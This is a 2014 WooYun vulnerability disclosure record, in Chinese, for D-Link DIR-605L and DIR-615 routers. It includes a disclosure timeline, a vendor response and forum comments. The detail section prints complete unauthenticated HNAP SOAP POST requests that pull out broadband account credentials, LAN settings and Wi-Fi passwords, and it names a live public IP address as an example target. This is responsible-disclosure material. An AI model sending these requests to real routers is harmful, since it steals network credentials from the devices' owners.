{"id": 1046, "wybug_id": "wooyun-2014-066906", "wybug_title": "D-Link两款路由发送特定POST包获取宽带帐号wifi等密码", "wybug_corp": "D-Link", "wybug_author": "YY-2012", "wybug_date": "2014-07-01 21:32", "wybug_open_date": "2014-09-29 21:34", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向公众公开  简要描述： 获取外网IP地址直接POST发包可以获取宽带帐号，wifi密码等信息。如有不服，你他吗的来打我。。 详细说明：  固件版本 : 1.12硬件版本 : Ax型号 : DIR-605L添加：型号 DIR-615同样受影响。获取宽带帐号等信息\nPOST /HNAP1/ HTTP/1.0Connection: keep-aliveContent-Length: 331SOAPAction: \"http://purenetworks.com/HNAP1/GetWanSettings\"Host: 地址:8080Accept: text/html, */*Accept-Encoding: identityUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelopexmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"xmlns:soap=\"http://schemas.xmlsoap.org/soap/encoding/\">\t<soap:Body>\t\t<GetWanSettings xmlns=\"http://purenetworks.com/HNAP1/\">\t\t</GetWanSettings>\t</soap:Body></soap:Envelope>\n获取路由内网地址信息\nPOST /HNAP1/ HTTP/1.0Connection: keep-aliveContent-Length: 343SOAPAction: \"http://purenetworks.com/HNAP1/GetRouterLanSettings\"Host: 地址:8080Accept: text/html, */*Accept-Encoding: identityUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelopexmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"xmlns:soap=\"http://schemas.xmlsoap.org/soap/encoding/\">\t<soap:Body>\t\t<GetRouterLanSettings xmlns=\"http://purenetworks.com/HNAP1/\">\t\t</GetRouterLanSettings>\t</soap:Body></soap:Envelope>\n获取wifi密码等信息\nPOST /HNAP1/ HTTP/1.0Connection: keep-aliveContent-Length: 380SOAPAction: \"http://purenetworks.com/HNAP1/GetWLanRadioSecurity\"Host: 地址:8080Accept: text/html, */*Accept-Encoding: identityUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelopexmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"xmlns:soap=\"http://schemas.xmlsoap.org/soap/encoding/\">\t<soap:Body>\t\t<GetWLanRadioSecurity xmlns=\"http://purenetworks.com/HNAP1/\">\t\t<RadioID>2.4GHZ</RadioID>\t\t</GetWLanRadioSecurity>\t</soap:Body></soap:Envelope>\n\n案例：http://27.45.196.132:8080/\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  。。   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-07-05 23:39 厂商回复： CNVD确认并在多个实例上复现所情况，并与wooyun-2014-一并由CNVD通过公开联系渠道向设备生产厂商友迅电子设备（上海）有限公司通报。生产厂商反馈称新固件已经解决相关问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-01 21:33 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  沙发》？？好紧张    \n     2014-07-01 21:38 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @疯狗 编辑了处理下，，暂时发现两款D-Link可以以上操作。    \n     2014-07-01 22:24 |    \t\t小周周 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 请多指教！)\t\t \n  o.O    \n     2014-07-02 09:47 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  看起来很吊的样子    \n     2014-07-02 11:04 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @YY-2012 嗯，都变更了    \n     2014-07-03 13:52 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  前排出售盖伦    \n     2014-07-03 15:49 |    \t\t汪哥 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:6        )\t\t \n  前排    \n     2015-04-22 12:56 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  想问下GET 可以获得么？header带上，SOAPAction: \"http://purenetworks.com/HNAP1/GetWanSettings\"    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}